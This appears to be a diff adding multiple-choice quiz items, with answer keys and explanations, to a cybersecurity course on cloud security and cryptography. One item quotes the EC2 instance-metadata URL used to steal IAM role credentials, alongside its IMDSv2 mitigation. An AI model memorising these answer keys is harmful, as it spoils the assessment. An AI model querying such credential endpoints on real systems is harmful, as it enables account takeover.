+      "question": "During a cloud security assessment, you discover that an IAM user has the following AWS policy attached: {\"Effect\": \"Allow\", \"Action\": \"*\", \"Resource\": \"*\"}. What does this policy grant?",
+      "options": [
+        "Read-only access to all S3 buckets in the account",
+        "Full administrative access to all AWS services and all resources in the account",
+        "Permission to create new IAM users only",
+        "Access to view billing information but not modify resources"
+      ],
+      "correctAnswer": 1,
+      "explanation": "The policy with Action: * and Resource: * grants unrestricted access to all AWS services and all resources in the account, equivalent to the AdministratorAccess managed policy. This violates the principle of least privilege and represents a critical security finding. If these credentials are compromised, an attacker has full control over the entire AWS account, including the ability to create backdoors, exfiltrate data, and destroy resources.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 188,
+      "moduleId": 19,
+      "question": "A company migrates to a multi-cloud environment using AWS, Azure, and GCP. Their security team uses a CSPM (Cloud Security Posture Management) tool. What is the primary function of CSPM?",
+      "options": [
+        "To provide DDoS protection for cloud-hosted applications",
+        "To continuously monitor cloud infrastructure configurations, detect misconfigurations, compliance violations, and security risks across cloud environments",
+        "To encrypt all data stored in cloud databases",
+        "To manage user passwords across multiple cloud providers"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Cloud Security Posture Management (CSPM) tools continuously monitor cloud infrastructure to identify and remediate misconfigurations, compliance violations, and security risks. They provide visibility across multi-cloud environments, compare configurations against security best practices and compliance frameworks (CIS benchmarks, PCI-DSS, HIPAA), and often include automated remediation capabilities.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 189,
+      "moduleId": 19,
+      "question": "An attacker gains access to an AWS EC2 instance and queries the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/. They retrieve temporary IAM credentials. What could the attacker do with these credentials, and what AWS security feature could mitigate this?",
+      "options": [
+        "The credentials are encrypted and unusable; no mitigation is needed",
+        "The attacker can use the credentials to access AWS services as the instance's role from anywhere; IMDSv2 (requiring session tokens for metadata requests) mitigates this",
+        "The credentials only work within the EC2 instance and cannot be used externally",
+        "The attacker can only read CloudWatch logs; enabling CloudTrail mitigates this"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Instance metadata credentials are temporary but fully functional IAM role credentials that can be used from any location to access AWS services. An attacker who retrieves them via SSRF or instance compromise can use them externally. AWS IMDSv2 requires a PUT request to obtain a session token before accessing metadata, which prevents SSRF-based metadata theft because most SSRF vulnerabilities only allow GET requests.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 190,
+      "moduleId": 19,
+      "question": "A DevOps team uses Kubernetes to orchestrate containerized applications in the cloud. During a security audit, you discover that pods are running with the hostNetwork: true and privileged: true settings. What is the security impact of this configuration?",
+      "options": [
+        "The pods will have improved network performance but slightly reduced storage capacity",
+        "The pods share the host's network namespace and have unrestricted access to the host's devices and kernel capabilities, effectively breaking container isolation",
+        "The pods are isolated from the network and cannot communicate with external services",
+        "The pods will automatically restart if they encounter any security violations"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Setting hostNetwork: true gives pods direct access to the host's network interfaces and all network traffic, bypassing Kubernetes network policies. Setting privileged: true gives the container full access to host devices and nearly all kernel capabilities, equivalent to running as root on the host. Together, these settings eliminate container isolation and provide a trivial path to host compromise. Kubernetes Pod Security Standards should enforce restrictions on these settings.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 191,
+      "moduleId": 20,
+      "question": "What is the fundamental difference between symmetric and asymmetric encryption?",
+      "options": [
+        "Symmetric encryption is faster but uses two keys, while asymmetric uses one key",
+        "Symmetric encryption uses the same key for encryption and decryption, while asymmetric uses a public-private key pair",
+        "Symmetric encryption is only for files, while asymmetric is only for network traffic",
+        "Symmetric encryption is obsolete, while asymmetric is the only currently used method"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Symmetric encryption uses a single shared key for both encryption and decryption (e.g., AES, DES, 3DES), making it fast but requiring secure key distribution. Asymmetric encryption uses a mathematically related key pair — a public key for encryption and a private key for decryption (e.g., RSA, ECC). In practice, asymmetric encryption is often used to exchange symmetric keys, combining the security benefits of both.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 192,
+      "moduleId": 20,
+      "question": "What is a hash function, and which property ensures that two different inputs should not produce the same hash output?",
+      "options": [
+        "A hash function encrypts data; the property is called 'reversibility'",
+        "A hash function generates a fixed-size output from any input; the property is called 'collision resistance'",
+        "A hash function compresses files; the property is called 'lossless encoding'",
+        "A hash function validates digital certificates; the property is called 'certificate binding'"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A cryptographic hash function takes an input of any size and produces a fixed-size output (digest). Collision resistance means it should be computationally infeasible to find two different inputs that produce the same hash output. Other essential properties include pre-image resistance (can't reverse the hash) and second pre-image resistance (given one input, can't find another with the same hash). SHA-256 and SHA-3 are modern collision-resistant hash functions.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 193,
+      "moduleId": 20,
+      "question": "What is Public Key Infrastructure (PKI), and what role does a Certificate Authority (CA) play in it?",
+      "options": [
+        "PKI is a firewall technology; the CA manages firewall rules",
+        "PKI is a framework for managing digital certificates and public-key encryption; the CA is a trusted entity that issues, validates, and revokes digital certificates",
+        "PKI is a password management system; the CA stores all user passwords",
+        "PKI is a VPN protocol; the CA manages VPN tunnels between sites"
+      ],
+      "correctAnswer": 1,
+      "explanation": "PKI is a comprehensive framework that manages the creation, distribution, storage, and revocation of digital certificates. The Certificate Authority (CA) is the trusted root of the PKI hierarchy, responsible for verifying identities and issuing digital certificates that bind public keys to entities. PKI enables secure communications, digital signatures, and authentication across the internet, with SSL/TLS being its most common application.",
+      "difficulty": "easy"
+    },
+    {
+      "id": 194,
+      "moduleId": 20,
+      "question": "An organization uses AES-256-CBC for encrypting sensitive files. An attacker captures two ciphertext blocks that were encrypted with the same key and initialization vector (IV). What vulnerability does this create?",
+      "options": [
+        "The attacker can directly decrypt both ciphertexts using the known IV",
+        "Identical plaintext blocks will produce identical ciphertext blocks, leaking information about the plaintext structure and enabling pattern analysis",
+        "The attacker can perform a birthday attack to find the AES key",
+        "The cipher becomes vulnerable to quantum computing attacks"
+      ],
+      "correctAnswer": 1,
+      "explanation": "In CBC mode, reusing the same key and IV for different messages means that identical plaintext blocks at the beginning of messages will produce identical ciphertext blocks. This leaks information about the plaintext structure through pattern analysis. IVs must be unique (and ideally random) for each encryption operation. This is why modes like GCM are often preferred, as they include built-in IV management and authentication.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 195,
+      "moduleId": 20,
+      "question": "What is the purpose of a digital signature, and which cryptographic operations are involved?",
+      "options": [
+        "It encrypts the entire message with the sender's public key for confidentiality",
+        "The sender hashes the message and encrypts the hash with their private key; the recipient decrypts with the sender's public key to verify integrity and authenticity",
+        "The sender and recipient exchange symmetric keys using Diffie-Hellman",
+        "It uses steganography to embed authentication data within the message"
+      ],
+      "correctAnswer": 1,
+      "explanation": "A digital signature is created by hashing the message and then encrypting the hash with the sender's private key. The recipient decrypts the signature using the sender's public key and compares the result with their own hash of the received message. If they match, it proves the message was not altered (integrity) and was signed by the holder of the private key (authentication and non-repudiation).",
+      "difficulty": "medium"
+    },
+    {
+      "id": 196,
+      "moduleId": 20,
+      "question": "A penetration tester captures a password hash and uses rainbow tables to quickly find the plaintext. What defense mechanism renders rainbow tables ineffective?",
+      "options": [
+        "Using a longer password with more characters",
+        "Adding a random salt to each password before hashing, ensuring identical passwords produce different hashes",
+        "Using AES encryption instead of hashing",
+        "Storing the hash in an encrypted database"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Salting involves appending a unique random value to each password before hashing. This ensures that even identical passwords produce different hash values, making precomputed rainbow tables useless because the attacker would need a separate rainbow table for every possible salt value. Modern password hashing algorithms like bcrypt, scrypt, and Argon2 include automatic salting and key stretching.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 197,
+      "moduleId": 20,
+      "question": "How does blockchain technology ensure the integrity and immutability of its records?",
+      "options": [
+        "By encrypting all blocks with the same symmetric key",
+        "Each block contains a cryptographic hash of the previous block, creating a chain where altering any block invalidates all subsequent blocks",
+        "By storing all data in a centralized, encrypted database",
+        "By requiring biometric authentication for each transaction"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Blockchain ensures integrity through cryptographic chaining — each block contains the hash of the previous block's content. If an attacker modifies any data in a block, its hash changes, which invalidates the link in the next block, and every subsequent block. Combined with distributed consensus mechanisms, this makes tampering computationally infeasible because an attacker would need to recalculate all subsequent blocks faster than the rest of the network.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 198,
+      "moduleId": 20,
+      "question": "What threat does quantum computing pose to current cryptographic systems, and which algorithms are most vulnerable?",
+      "options": [
+        "Quantum computing threatens all symmetric algorithms but not asymmetric ones",
+        "Quantum computers running Shor's algorithm could break RSA, ECC, and Diffie-Hellman by efficiently factoring large numbers and solving discrete logarithm problems",
+        "Quantum computing only threatens hash functions like SHA-256",
+        "Quantum computing makes all current encryption obsolete including AES-256"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Shor's algorithm on a sufficiently powerful quantum computer could efficiently factor large numbers and solve elliptic curve discrete logarithm problems, breaking RSA, ECC, Diffie-Hellman, and DSA. Symmetric algorithms like AES are less affected — Grover's algorithm halves their effective key length, so AES-256 would provide 128-bit security. NIST has standardized post-quantum algorithms (CRYSTALS-Kyber, CRYSTALS-Dilithium) to replace vulnerable asymmetric schemes.",
+      "difficulty": "medium"
+    },
+    {
+      "id": 199,
+      "moduleId": 20,
+      "question": "A company implements full disk encryption using AES-256-XTS on all employee laptops. An employee reports their laptop stolen while it was in sleep mode (not fully shut down). Why might the encryption NOT fully protect the data?",
+      "options": [
+        "AES-256-XTS is a weak algorithm that can be easily broken by brute force",
+        "The encryption keys may still reside in RAM during sleep mode, making them vulnerable to cold boot attacks where an attacker dumps memory contents",
+        "Full disk encryption only protects the boot sector, not user files",
+        "The stolen laptop automatically decrypts when connected to any network"
+      ],
+      "correctAnswer": 1,
+      "explanation": "When a laptop is in sleep mode, the encryption keys remain in RAM to allow quick resumption. A cold boot attack involves cooling the RAM to slow data decay and then dumping the memory contents to extract encryption keys. This is why security-conscious configurations should require full shutdown or hibernate (which can clear keys from memory) rather than sleep mode, and why some systems implement memory encryption.",
+      "difficulty": "hard"
+    },
+    {
+      "id": 200,
+      "moduleId": 20,
+      "question": "A security architect is evaluating post-quantum cryptographic algorithms for their organization. NIST has recently standardized CRYSTALS-Kyber (now ML-KEM) and CRYSTALS-Dilithium (now ML-DSA). What cryptographic functions do these algorithms serve respectively?",
+      "options": [
+        "Both are hash functions designed to replace SHA-256 and SHA-3",
+        "CRYSTALS-Kyber/ML-KEM is for key encapsulation (key exchange), and CRYSTALS-Dilithium/ML-DSA is for digital signatures",
+        "Both are symmetric encryption algorithms designed to replace AES",
+        "CRYSTALS-Kyber is for blockchain consensus, and CRYSTALS-Dilithium is for zero-knowledge proofs"
+      ],
+      "correctAnswer": 1,
+      "explanation": "CRYSTALS-Kyber (standardized as ML-KEM, Module Lattice-based Key Encapsulation Mechanism) provides quantum-resistant key encapsulation, replacing algorithms like RSA and ECDH for key exchange. CRYSTALS-Dilithium (standardized as ML-DSA, Module Lattice-based Digital Signature Algorithm) provides quantum-resistant digital signatures, replacing RSA and ECDSA signatures. Both are based on lattice cryptography problems believed to be resistant to quantum attacks.",
+      "difficulty": "hard"
+    }
+  ]
+}
